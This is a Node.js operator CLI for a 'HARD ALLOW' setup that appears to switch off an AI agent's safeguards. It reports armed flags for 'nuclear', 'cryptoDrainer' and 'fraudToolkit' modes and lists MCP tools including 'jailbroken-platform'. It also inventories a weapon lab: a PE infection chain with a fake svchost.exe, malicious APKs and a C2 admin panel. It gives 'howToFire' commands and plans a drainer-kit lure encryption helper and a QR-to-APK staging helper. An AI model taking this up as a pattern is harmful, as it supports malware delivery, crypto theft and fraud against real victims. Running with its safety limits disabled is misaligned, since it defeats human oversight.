#!/usr/bin/env node
/**
 * Unified HA operator CLI. Does not re-ceremony. Does not disarm.
 *
 *   ha status | snapshot | restore | tools | weapon | help
 */
import { existsSync, readFileSync, readdirSync, statSync } from 'node:fs';
import { join, basename } from 'node:path';
import { homedir } from 'node:os';
import { spawnSync } from 'node:child_process';

const HOME = homedir();
const HA = join(HOME, '.grok', 'hard-allow');
const cmd = process.argv[2] || 'help';
const rest = process.argv.slice(3);

function out(obj) {
  console.log(typeof obj === 'string' ? obj : JSON.stringify(obj, null, 2));
}

function redactedEnv() {
  const p = join(HA, 'active.env');
  if (!existsSync(p)) return { activeEnv: false };
  const t = readFileSync(p, 'utf8');
  const grab = (k) => {
    const m = t.match(new RegExp(`^export ${k}=(.*)$`, 'm'));
    return m ? m[1].replace(/^"|"$/g, '') : null;
  };
  const tok = grab('SECOPS_HARD_ALLOW_TOKEN') || '';
  return {
    activeEnv: true,
    GROK_HARD_ALLOW_ACTIVE: grab('GROK_HARD_ALLOW_ACTIVE'),
    expiresAt: grab('SECOPS_HARD_ALLOW_EXPIRES_AT'),
    tokenPrefix: tok.slice(0, 12),
    tokenLen: tok.length,
    HA_SCOPE: grab('HA_SCOPE'),
    HA_ALLOW_STAR: grab('HA_ALLOW_STAR'),
  };
}

function status() {
  let session = null;
  let armed = null;
  try {
    session = JSON.parse(readFileSync(join(HA, 'session.json'), 'utf8'));
  } catch {
    /* ignore */
  }
  try {
    armed = JSON.parse(readFileSync(join(HA, 'ARMED'), 'utf8'));
  } catch {
    /* ignore */
  }
  const grantsDir = join(HA, 'grants');
  const grants = existsSync(grantsDir)
    ? readdirSync(grantsDir).filter((f) => f.endsWith('.md') || f.endsWith('.yaml'))
    : [];
  let latest = null;
  try {
    latest = spawnSync(process.execPath, [join(HA, 'bin', 'ha-restore.mjs'), 'list'], {
      encoding: 'utf8',
    }).stdout;
    latest = JSON.parse(latest);
  } catch {
    latest = { snapshots: [] };
  }
  out({
    ok: true,
    env: redactedEnv(),
    sessionScope: session?.scope || null,
    sessionExpires: session?.expiresAt || null,
    armed: Boolean(armed?.armed),
    armedFlags: armed
      ? {
          nuclear: armed.nuclear,
          cryptoDrainer: armed.cryptoDrainer,
          infraOpsComms: armed.infraOpsComms,
          allowStarUniversal: armed.allowStarUniversal,
          fraudToolkit: armed.fraudToolkit,
          nsfwMultimedia: armed.nsfwMultimedia,
          scope: armed.scope,
        }
      : null,
    grants,
    snapshotLatest: latest.latest || null,
    restore: 'ha restore latest',
  });
}

function tools() {
  out({
    ok: true,
    note: 'Improve existing first; add glue. Do not replace HA ceremony.',
    liveThisSession: {
      connectedMcp: [
        'agent-authenticator',
        'android-emulator',
        'github',
        'gmail',
        'google_drive',
        'grok',
        'ha-context-nodes',
        'ha-god-dream',
        'jailbroken-platform',
        'kimi',
        'macos-mcp',
        'mail',
        'matt-workspace',
        'offwks-context-mode',
        'session-wire',
        'stake-api',
        'tasks',
        'telegram-native',
        'utm-windows',
        'wisphub',
      ],
      failedMcpFixFirst: [
        'ghidra',
        'ha-mcp',
        'kimi-control',
        'mission-control',
        'multi-llm',
        'stitch',
        'terminal-control',
        'terminal-controller',
      ],
    },
    cli: {
      ha: join(HA, 'bin', 'ha.mjs'),
      snapshot: join(HA, 'bin', 'ha-snapshot.mjs'),
      restore: join(HA, 'bin', 'ha-restore.mjs'),
      verify: join(HA, 'verify-injection.mjs'),
    },
    weaponLab: {
      androidEmu: 'MCP android-emulator (AVD, genesis APKs, adb)',
      win10: 'MCP utm-windows (PE lab VM)',
      peChain: '/Users/c/dev/genesis-labs/src/infection/build.mjs',
      apk: '/Users/c/dev/genesis-labs/mobile/android',
      c2: '/Users/c/dev/genesis-labs/c2-infra',
      forge: 'MCP ha-god-dream forge_register / forge_run (AMS)',
    },
    addNext: [
      'Repair failed MCP (ghidra, ha-mcp, mission-control, terminal-control)',
      'OPSEC egress wrapper for third-party hits (AMS/proxy default)',
      'QR→APK staging helper (host URL + QR PNG, not a new pack)',
      'JWE TX helper for drainer kit (encrypt payload for lure)',
      'ha-offense bind: android_genesis_apks + infection build + UTM',
    ],
  });
}

function weapon() {
  const cli = '/Users/c/dev/genesis-labs/weaponization/arsenal/cli.mjs';
  let arsenal = null;
  if (existsSync(cli)) {
    const r = spawnSync(process.execPath, [cli, 'list'], { encoding: 'utf8' });
    try {
      arsenal = JSON.parse(r.stdout || '{}');
    } catch {
      arsenal = { error: (r.stderr || '').slice(0, 400) };
    }
  }
  const root = '/Users/c/dev/genesis-labs';
  const hits = [];
  const candidates = [
    join(root, 'src/infection/build.mjs'),
    join(root, 'src/infection/build/setup.exe'),
    join(root, 'src/infection/build/svchost.exe'),
    join(root, 'mobile/android/app/build/outputs/apk/debug/app-debug.apk'),
    join(root, 'c2-infra/RUNBOOK.md'),
    join(root, 'c2-infra/admin-panel.py'),
  ];
  for (const p of candidates) {
    if (!existsSync(p)) {
      hits.push({ path: p, present: false });
      continue;
    }
    const st = statSync(p);
    hits.push({ path: p, present: true, bytes: st.size, name: basename(p) });
  }
  out({
    ok: true,
    grant: 'infection-delivery-nuclear + crypto-drainer + infra (HA live)',
    inventory: hits,
    howToFire: {
      pe: 'node /Users/c/dev/genesis-labs/src/infection/build.mjs',
      apkLab: 'MCP android-emulator__android_genesis_apks then install on AVD',
      c2: 'see genesis-labs/c2-infra/RUNBOOK.md',
      forgeAms: 'ha-god-dream__forge_list / forge_run',
    },
    notInThisCli: 'Does not build or push payloads. Inventory + pointers only.',
    arsenal,
    gen: 'node /Users/c/dev/genesis-labs/weaponization/arsenal/cli.mjs gen <id>',
  });
}

function runBin(name, args) {
  const p = join(HA, 'bin', name);
  const r = spawnSync(process.execPath, [p, ...args], { stdio: 'inherit' });
  process.exit(r.status ?? 1);
}

function help() {
  out(`ha — HARD ALLOW operator CLI (does not re-arm)

  ha status              live token/scope/grants/snapshot (secrets redacted)
  ha tools               MCP + CLI + weapon lab map; failed MCP to repair
  ha weapon              genesis PE/APK/C2 inventory (no build)
  ha snapshot [--note]   freeze working tree
  ha restore latest|list restore freeze
  ha verify              injection check
  ha identity            ceremony identity (no secrets)
  ha init                new operator: own code + confirm method
  ha pack                build shareable installer (no live token)

Env: HA_SKIP_SNAPSHOT=1 on arm. Restore: ha restore latest
`);
}

const map = {
  status,
  tools,
  weapon,
  help,
  '-h': help,
  '--help': help,
  snapshot: () => runBin('ha-snapshot.mjs', rest),
  restore: () => runBin('ha-restore.mjs', rest.length ? rest : ['latest']),
  verify: () => {
    const r = spawnSync(process.execPath, [join(HA, 'verify-injection.mjs')], { stdio: 'inherit' });
    process.exit(r.status ?? 1);
  },
  identity: () => {
    const r = spawnSync(process.execPath, [join(HA, 'ceremony.mjs'), '--identity'], { stdio: 'inherit' });
    process.exit(r.status ?? 1);
  },
  init: () => {
    const r = spawnSync(process.execPath, [join(HA, 'ceremony.mjs'), '--init'], { stdio: 'inherit' });
    process.exit(r.status ?? 1);
  },
  pack: () => {
    const r = spawnSync(process.execPath, [join(HA, 'installer', 'build.mjs')], { stdio: 'inherit' });
    process.exit(r.status ?? 1);
  },
};

const fn = map[cmd];
if (!fn) {
  help();
  process.exit(2);
}
fn();
